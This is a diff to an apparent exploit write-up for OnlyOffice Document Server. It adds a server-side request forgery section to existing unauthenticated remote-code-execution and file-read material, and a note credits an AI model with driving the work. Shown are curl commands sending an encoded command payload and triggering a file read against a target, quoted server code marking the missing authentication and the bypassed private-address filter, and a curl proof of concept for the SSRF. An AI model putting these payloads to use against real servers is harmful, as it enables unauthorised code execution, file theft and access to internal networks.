@@ -1,4 +1,4 @@
-# OnlyOffice Document Server Unauthenticated RCE and LFI
+# OnlyOffice Document Server Unauthenticated RCE and LFI and SSRF
 
 # 完全由glm5.3flash驱动 测试环境是windows，linux环境需要修改脚本
 
@@ -135,4 +135,24 @@ curl -sS -X POST 'http://TARGET/downloadas/x?cmd=%7B%22c%22%3A%20%22save%22%2C%2
 
 # B) 触发读取（docid 随便填，换新 docid 绕开 5 分钟 apicache）
 curl -sS 'http://TARGET/wopi/files/rd1/contents'
+```
+
+# SSRF
+
+- DocService/sources/canvasservice.js#downloadFile（路由 app.get('/downloadfile/:docid', canvasService.downloadFile) —— 既没有 checkClientIp 也没有 checkJwt）：
+
+```js
+const decoded = (await docsCoServer.getRequestParams(ctx, req)).params;   // inbox token 默认关 ⇒ 就是 ?url=
+...
+} else if (!tenTokenEnableBrowser) {          // browser token 默认 false ⇒ 命中这里
+    if (decoded.url) { url = decoded.url; isInJwtToken = true; }  // ★ 硬编码 isInJwtToken=true
+}
+yield utils.downloadUrlPromise(ctx, url, ..., isInJwtToken /*第6参=opt_filterPrivate*/, ...);
+res.set(response.headers); yield pipeline(stream, res);           // ★ 内容+响应头原样回吐
+```
+
+## POC
+
+```
+curl -sS 'http://127.0.0.1:8081/downloadfile/0?url=http://127.0.0.1:8000/index.html'
 ```
